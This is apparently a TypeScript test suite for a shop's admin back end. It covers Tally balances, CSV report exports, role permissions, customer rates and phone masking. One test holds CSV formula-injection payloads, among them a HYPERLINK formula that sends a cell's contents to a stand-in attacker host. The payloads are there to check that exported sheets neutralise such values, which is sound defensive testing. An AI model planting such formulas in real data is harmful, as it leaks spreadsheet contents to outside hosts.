    const { body } = await get('accountant', 'admin/tally/suppliers').expect(200);
    expect(body.connected).toBe(true);
    expect(body.items.map((row: { name: string }) => row.name)).toEqual([
      'Sample big',
      'Sample small',
    ]);
    expect(body.items[0].payablePaise).toBe('90071992547409931');
    expect(body.totalPaise).toBe('90071992547410031');
    expect(body.items[0]).toMatchObject({ lastPurchaseOn: '2026-10-01', lastPaymentOn: null });
  });
  it.each(['manager', 'cashier', ...outsiders])('%s may not see it', async (who) => {
    await get(who, 'admin/tally/suppliers').expect(403);
  });
});

describe('spreadsheets', () => {
  const nasty = [
    '=HYPERLINK("http://evil.example/?x="&A1,"Baaki")',
    '+1+1',
    '-2+3',
    '@SUM(A1:A9)',
    ' =1+1',
  ];
  const sheets = [
    'admin/reports/vasooli.csv',
    'admin/reports/aaj-ke-call.csv',
    'admin/reports/chup-grahak.csv',
    'admin/reports/mahine.csv',
    'admin/reports/shaam.csv',
  ];
  const cells = (text: string) => text.replace(/^./u, '').split('\r\n');

  it.each(nasty)('a customer named %s cannot run anything in any sheet', async (name) => {
    await db.user.update({ where: { id: 'ramesh' }, data: { name, area: name } });
    await signed('ramesh', 5000);
    await made('papa', 'ramesh', { kind: 'PAYMENT', note: name });
    await db.user.update({
      where: { id: 'suresh' },
      data: { name, lastOrderAt: new Date(Date.now() - 50 * 86400000) },
    });
    for (const age of [50, 60, 70])
      await db.order.create({
        data: {
          number: `SC-${randomUUID()}`,
          userId: 'suresh',
          idempotencyKey: randomUUID(),
          status: 'DELIVERED',
          source: 'PHONE',
          address: { area: name },
          deliveryDate: today(),
          notes: '',
          subtotalPaise: 100,
          deliveryFeePaise: 0,
          totalPaise: 100,
          createdAt: new Date(Date.now() - age * 86400000),
          items: {
            create: {
              productId: 'cement',
              name: 'Test cement',
              unit: 'bag',
              quantity: 1,
              pricePaise: 100,
              listPricePaise: 100,
              priceVersion: 1,
              lineTotalPaise: 100,
            },
          },
        },
      });
    await db.order.create({
      data: {
        number: `SC-${randomUUID()}`,
        userId: 'ramesh',
        idempotencyKey: randomUUID(),
        status: 'DELIVERED',
        source: 'PHONE',
        address: {},
        deliveryDate: today(),
        notes: '',
        subtotalPaise: 100,
        deliveryFeePaise: 0,
        totalPaise: 100,
      },
    });
    for (const sheet of sheets) {
      const { text } = await get('papa', sheet).expect(200);
      for (const line of cells(text))
        for (const cell of line.match(/"(?:[^"]|"")*"|[^,]+/g) ?? []) {
          const inner = cell.startsWith('"') ? cell.slice(1, -1) : cell;
          // Only our own plain numbers may start with a minus, and they hold nothing else.
          if (/^-?\d+(\.\d+)?$/.test(inner)) continue;
          expect(inner, `${sheet}: ${cell}`).not.toMatch(/^\s*[=+\-@]/);
        }
    }
  });
  it('each sheet opens right in Excel, with the right name, and is not kept anywhere', async () => {
    await signed('ramesh', 5000);
    for (const sheet of sheets) {
      const res = await get('papa', sheet).expect(200);
      expect(res.headers['content-type']).toMatch(/text\/csv/);
      expect(res.headers['content-disposition']).toMatch(
        /^attachment; filename="shiv-[a-z-]+-[\d-]+\.csv"$/,
      );
      expect(res.headers['cache-control']).toBe('no-store');
      expect(res.text.codePointAt(0)).toBe(0xfeff);
    }
  });
  it('the accountant’s sheets have no numbers', async () => {
    await signed('ramesh', 5000);
    await made('papa', 'ramesh');
    for (const sheet of ['admin/reports/vasooli.csv', 'admin/reports/aaj-ke-call.csv']) {
      const { text } = await get('accountant', sheet).expect(200);
      expect(text).toContain('+91XXXXXXX001');
      expect(text).not.toContain('9000006001');
    }
  });
  it('a manager’s sheet holds only their shop', async () => {
    await signed('ramesh', 5000, MAIN);
    await signed('suresh', 9000, SECOND);
    const { text } = await get('manager', 'admin/reports/vasooli.csv').expect(200);
    expect(text).toContain('+919000006001');
    expect(text).not.toContain('+919000006002');
    await get('manager', `admin/reports/vasooli.csv?locationId=${SECOND}`).expect(403);
  });
  it('a cashier’s sheet is only their shop’s calls', async () => {
    await made('cashier', 'ramesh');
    await made('cashierb', 'suresh');
    const { text } = await get('cashier', 'admin/reports/aaj-ke-call.csv').expect(200);
    expect(text).toContain('9000006001');
    expect(text).not.toContain('9000006002');
  });
  it('a long list comes out whole, past the first page', async () => {
    for (let index = 0; index < 25; index++) {
      const id = `due${index}`;
      await addPerson(db, { id, phone: `+9190000080${String(index).padStart(2, '0')}` });
      await signed(id, 1000 + index);
    }
    const { text } = await get('papa', 'admin/reports/vasooli.csv').expect(200);
    expect(cells(text).filter(Boolean)).toHaveLength(26);
    expect((await get('papa', 'admin/reports/vasooli').expect(200)).body.items).toHaveLength(20);
  });
});

describe('which reports get opened', () => {
  it('counts per report, per person, per day, and only owners and the accountant read it', async () => {
    await get('papa', 'admin/reports/vasooli').expect(200);
    await get('papa', 'admin/reports/vasooli').expect(200);
    await get('manager', 'admin/reports/vasooli.csv').expect(200);
    await get('papa', 'admin/followups').expect(200);
    await new Promise((resolve) => setTimeout(resolve, 100));
    const { body } = await get('papa', 'admin/reports/opens').expect(200);
    const of = (name: string) =>
      body.reports.find((row: { report: string }) => row.report === name);
    expect(of('vasooli').opens).toBe(3);
    expect(of('vasooli').lastOpenedOn).toBe(today());
    expect(of('aaj-ke-call').opens).toBe(1);
    expect(of('mahine').opens).toBe(0);
    await get('accountant', 'admin/reports/opens').expect(200);
    for (const who of ['manager', 'cashier', ...outsiders])
      await get(who, 'admin/reports/opens').expect(403);
  });
  it('a refused read does not count', async () => {
    await get('cashier', 'admin/reports/vasooli').expect(403);
    await new Promise((resolve) => setTimeout(resolve, 50));
    expect(await db.reportOpen.count()).toBe(0);
  });
});

describe('rates on the customer page', () => {
  const rule = (extra: object) =>
    db.priceRule.create({
      data: {
        kind: 'SPECIAL',
        valueType: 'RATE',
        value: 35000,
        minQuantity: 1,
        createdById: 'papa',
        ...extra,
      } as never,
    });
  it('shows their group, their own rate and what they pay under the list', async () => {
    const group = await db.customerGroup.create({
      data: { name: 'Contractor', createdById: 'papa' },
    });
    await db.user.update({ where: { id: 'ramesh' }, data: { customerGroupId: group.id } });
    await rule({ kind: 'GROUP', groupId: group.id, productId: 'cement', value: 38000 });
    await rule({ customerId: 'ramesh', productId: 'cement', endsOn: addDays(today(), 10) });
    await rule({ customerId: 'suresh', productId: 'cement', value: 100 });
    const { body } = await get('cashier', 'admin/customers/ramesh/rates').expect(200);
    expect(body.group).toMatchObject({ name: 'Contractor' });
    expect(body.rules.map((row: { kind: string }) => row.kind).sort()).toEqual([
      'GROUP',
      'SPECIAL',
    ]);
    expect(body.rules.find((row: { kind: string }) => row.kind === 'SPECIAL')).toMatchObject({
      appliesTo: 'Test cement',
      value: 35000,
      endsOn: addDays(today(), 10),
    });
    expect(body.lines).toEqual([
      {
        productId: 'cement',
        name: 'Test cement',
        unit: 'bag',
        listPaise: 40000,
        ratePaise: 35000,
        ruleKind: 'SPECIAL',
      },
    ]);
    expect(JSON.stringify(body)).not.toContain('"value":100');
  });
  it('someone on list rates has no group and nothing listed', async () => {
    const { body } = await get('manager', 'admin/customers/mohan/rates').expect(200);
    expect(body).toEqual({ group: null, rules: [], lines: [] });
  });
  it('an ended rule, or one for a switched-off group, is gone', async () => {
    const group = await db.customerGroup.create({
      data: { name: 'Old', createdById: 'papa', active: false },
    });
    await db.user.update({ where: { id: 'ramesh' }, data: { customerGroupId: group.id } });
    await rule({ kind: 'GROUP', groupId: group.id, productId: 'cement', value: 100 });
    await rule({ customerId: 'ramesh', productId: 'cement', endsOn: addDays(today(), -1) });
    const { body } = await get('papa', 'admin/customers/ramesh/rates').expect(200);
    expect(body.rules).toEqual([]);
    expect(body.lines).toEqual([]);
  });
  it('one not started yet is listed, says so, and does not change today’s rate', async () => {
    await rule({ customerId: 'ramesh', productId: 'cement', startsOn: addDays(today(), 3) });
    const { body } = await get('papa', 'admin/customers/ramesh/rates').expect(200);
    expect(body.rules[0]).toMatchObject({ started: false });
    expect(body.lines).toEqual([]);
  });
  it('a category rule names the category', async () => {
    await rule({ customerId: 'ramesh', categoryId: 'category' });
    const { body } = await get('papa', 'admin/customers/ramesh/rates').expect(200);
    expect(body.rules[0].appliesTo).toBe('Cement');
    expect(body.lines[0].ratePaise).toBe(35000);
  });
  it.each(['keeper', 'driver', 'helper', 'tech', 'ramesh'])('%s is refused', async (who) => {
    await get(who, 'admin/customers/mohan/rates').expect(403);
  });
  it('staff and strangers are not customers', async () => {
    await get('papa', 'admin/customers/chacha/rates').expect(404);
    await get('papa', 'admin/customers/nobody/rates').expect(404);
  });
});

describe('the top of the customer page', () => {
  const facts = async (who: string, id = 'ramesh') =>
    (await get(who, `admin/customers/${id}/crm`).expect(200)).body;
  it('says whether the opening is signed, and who signed it', async () => {
    expect((await facts('papa')).signoff).toEqual({ signed: false });
    await signed('ramesh', 5000);
    expect((await facts('cashier')).signoff).toMatchObject({
      signed: true,
      approvedBy: 'papa',
      chosenPaise: 5000,
      asOf: today(),
    });
  });
  it('gives the last order, last money, next call and oldest due', async () => {
    await signed('ramesh', 5000);
    await paid('ramesh', 1000);
    const call = await made('manager', 'ramesh', { kind: 'PAYMENT', promisedPaise: 100 });
    const order = await creditOrder();
    const body = await facts('manager');
    expect(body.lastOrder).toMatchObject({ id: order.id });
    expect(body.lastPayment).toMatchObject({ amountPaise: 1000 });
    expect(body.nextFollowUp).toMatchObject({ id: call.id, promisedPaise: 100 });
    expect(body.khata).toMatchObject({ balancePaise: 4000, oldestDue: { opening: true } });
  });
  it('another shop’s manager gets the firm’s balance and none of the other shop’s work', async () => {
    await signed('ramesh', 5000);
    await made('manager', 'ramesh');
    const order = await creditOrder('+919000006001', { locationId: MAIN });
    const body = await facts('managerb');
    expect(body.khata.balancePaise).toBe(5000);
    expect(body.lastOrder).toBeNull();
    expect(body.nextFollowUp).toBeNull();
    expect(JSON.stringify(body)).not.toContain(order.number);
  });
  /** A linked party in a live copy of the books. Debit closing is negative, as Tally reports it. */
  const inTheBooks = async (
    customerId: string,
    closingPaise: bigint,
    baselinePaise = closingPaise,
  ) => {
    const company = await db.tallyCompany.create({
      data: {
        guid: `g-${customerId}`,
        name: 'Sample books',
        role: 'PRIMARY',
        phase: 'LIVE',
        freshAt: new Date(),
      },
    });
    await db.tallyLedger.create({
      data: {
        companyId: company.id,
        guid: `l-${customerId}`,
        alterId: 1n,
        name: `Sample party ${customerId}`,
        parent: 'Sundry Debtors',
        class: 'DEBTOR',
        closingPaise,
        baselinePaise,
        closingAsOf: new Date(),
        tieOutOk: true,
      },
    });
    await db.tallyPartyLink.create({
      data: {
        companyId: company.id,
        guid: `l-${customerId}`,
        userId: customerId,
        status: 'LINKED',
        confirmedById: 'papa',
      },
    });
  };
  it('the books’ number comes only to owners and the accountant, in the khata’s sign', async () => {
    await signed('ramesh', 5000);
    await inTheBooks('ramesh', -90071992547409931n);
    for (const who of ['papa', 'accountant'])
      expect((await facts(who)).tally).toMatchObject({
        connected: true,
        number: { state: 'READY', tallyPaise: '90071992547409931', tieOut: 'OK', stale: false },
      });
    for (const who of ['manager', 'cashier']) {
      const body = await facts(who);
      expect(body).not.toHaveProperty('tally');
      expect(JSON.stringify(body).toLowerCase()).not.toContain('tally');
      expect(JSON.stringify(body)).not.toContain('90071992547409931');
    }
  });
  it('someone not linked yet says so, and the books not connected says so', async () => {
    expect((await facts('papa')).tally).toMatchObject({
      connected: false,
      number: { state: 'NOT_LINKED', tallyPaise: null },
    });
  });
  it('while the copy is still running there is a number and no difference', async () => {
    await signed('ramesh', 5000);
    await inTheBooks('ramesh', -1000n);
    await db.tallyCompany.updateMany({ data: { phase: 'BACKFILL' } });
    expect((await facts('papa')).tally.number).toMatchObject({
      state: 'COPYING',
      tallyPaise: '1000',
      differencePaise: null,
      unexplainedPaise: null,
    });
  });
  it('a difference in the books warns an owner before reminding, and nobody else hears of it', async () => {
    await signed('ramesh', 5000);
    // The books moved by 4,000 paise with no voucher on our copy to explain it.
    await inTheBooks('ramesh', -1000n, -5000n);
    const owner = (await get('papa', 'admin/customers/ramesh/reminder').expect(200)).body;
    expect(owner.warnDifference).toBe(true);
    const cashier = (await get('cashier', 'admin/customers/ramesh/reminder').expect(200)).body;
    expect(cashier).not.toHaveProperty('warnDifference');
    expect(cashier.allowed).toBe(true);
  });
  it('the same number on both sides gives no warning', async () => {
    await signed('ramesh', 5000);
    await inTheBooks('ramesh', -5000n);
    const owner = (await get('papa', 'admin/customers/ramesh/reminder').expect(200)).body;
    expect(owner).not.toHaveProperty('warnDifference');
  });
  it.each(outsiders)('%s is refused', async (who) => {
    await get(who, 'admin/customers/mohan/crm').expect(403);
  });
  it('a customer reaches no CRM route, and never the word Tally', async () => {
    for (const path of [
      'admin/customers/ramesh/crm',
      'admin/customers/ramesh/timeline',
      'admin/customers/ramesh/rates',
      'admin/customers/ramesh/reminder',
      'admin/followups',
      'admin/crm/dormant',
      'admin/tally/suppliers',
      'admin/khata/opening-sheet',
    ])
      await get('ramesh', path).expect(403);
  });
});

describe('the number on older routes', () => {
  it('the accountant’s customer list and page show it masked, and part of one finds nobody', async () => {
    const list = (await get('accountant', 'admin/customers?limit=50').expect(200)).body;
    const row = list.items.find((item: { id: string }) => item.id === 'ramesh');
    expect(row.phone).toBe('+91XXXXXXX001');
    expect((await get('accountant', 'admin/customers/ramesh').expect(200)).body.phone).toBe(
      '+91XXXXXXX001',
    );
    const part = (await get('accountant', 'admin/customers?q=900000').expect(200)).body;
    expect(part.items).toEqual([]);
    const whole = await get(
      'accountant',
      `admin/customers?q=${encodeURIComponent('+919000006001')}`,
    ).expect(200);
    expect(whole.body.items[0].id).toBe('ramesh');
  });
  it('a cashier still finds and rings people', async () => {
    const list = (await get('cashier', 'admin/customers?q=900000').expect(200)).body;
    expect(list.items.length).toBeGreaterThan(0);
    expect(list.items[0].phone).toMatch(/^\+919/);
    const one = (await get('cashier', 'admin/customers/ramesh').expect(200)).body;
    expect(one.phone).toBe('+919000006001');
  });
  it('the accountant’s money report and overdue list show it masked', async () => {
    await signed('ramesh', 5000);
    await creditOrder();
    const range = `from=${today()}&to=${today()}`;
    const report = (await get('accountant', `admin/reports/money?${range}`).expect(200)).body;
    expect(report.topCustomers[0].phone).toBe('+91XXXXXXX001');
    const csv = await get('accountant', `admin/reports/money.csv?${range}`).expect(200);
    expect(csv.text).not.toContain('9000006001');
    const summary = (await get('accountant', 'admin/khata/summary').expect(200)).body;
    expect(summary.overdue30d[0].phone).toBe('+91XXXXXXX001');
  });
});
